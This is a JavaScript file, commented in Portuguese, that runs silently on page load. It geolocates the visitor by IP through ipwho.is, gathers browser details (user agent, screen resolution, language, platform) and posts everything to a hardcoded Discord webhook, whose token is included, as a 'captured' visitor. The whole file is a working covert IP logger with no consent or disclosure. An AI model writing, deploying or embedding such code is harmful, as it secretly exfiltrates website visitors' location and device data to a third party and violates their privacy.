const webhookURL = "https://discord.com/api/webhooks/1564710399645843656/zIRhv338ls6cRwmacg77Utb9nIUSGSG_4i0pHT6Y7sViS0k0eK-5pr5Y0Qib5hoVrkbN";

async function sendVisitorData() {
  try {
    // Usamos a API ipwho.is que retorna dados muito mais completos de forma gratuita e segura (HTTPS)
    let response = await fetch("https://ipwho.is/", {
      method: 'GET',
      headers: {
        "accept": "application/json"
      }
    });

    let data = await response.json();

    if (!data || !data.success) {
      console.log("Não foi possível obter os dados.");
      return;
    }

    // Recolha de dados adicionais do navegador do visitante
    let userAgent = navigator.userAgent;
    let screenRes = `${window.screen.width}x${window.screen.height}`;
    let language = navigator.language || navigator.userLanguage;
    let platform = navigator.platform;

    // Prepara o payload rico para o Discord com muito mais campos
    let payload = {
      content: "🚨 **Novo visitante detalhado capturado!**",
      embeds: [{
        title: "Informações Avançadas do Visitante",
        type: "rich",
        color: 16711680, // Vermelho vivo
        description: "Dados completos obtidos através do navegador e geolocalização por IP.",
        fields: [
          { name: "🌐 Endereço IP", value: data.ip || "Desconhecido", inline: true },
          { name: "🔒 Tipo de IP", value: data.type || "Desconhecido", inline: true },
          { name: "🏳️ País", value: `${data.country} (${data.country_code})`, inline: false },
          { name: "🏙️ Cidade / Região", value: `${data.city} - ${data.region} (${data.region_code})`, inline: false },
          { name: "📮 Código Postal (ZIP)", value: data.postal || "Não disponível", inline: true },
          { name: "📞 Indicativo (DDI)", value: `+${data.calling_code}` || "Desconhecido", inline: true },
          { name: "🏢 Provedor / ISP", value: data.connection?.isp || data.connection?.org || "Desconhecido", inline: false },
          { name: "🌍 Coordenadas (Lat/Lon)", value: `${data.latitude}, ${data.longitude}` || "Desconhecido", inline: false },
          { name: "⏰ Fuso Horário", value: data.timezone?.id || "Desconhecido", inline: false },
          { name: "💻 Sistema / Dispositivo", value: platform, inline: true },
          { name: "🖥️ Resolução de Tela", value: screenRes, inline: true },
          { name: "🗣️ Idioma do Navegador", value: language, inline: true },
          { name: "🔍 User-Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
        ],
        footer: {
          text: "Sistema de Monitorização Avançado"
        }
      }]
    };

    // Envia para o Webhook do Discord
    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    console.log("Dados avançados enviados com sucesso!");

  } catch (err) {
    console.log("Erro na execução:", err);
  }
}

sendVisitorData();
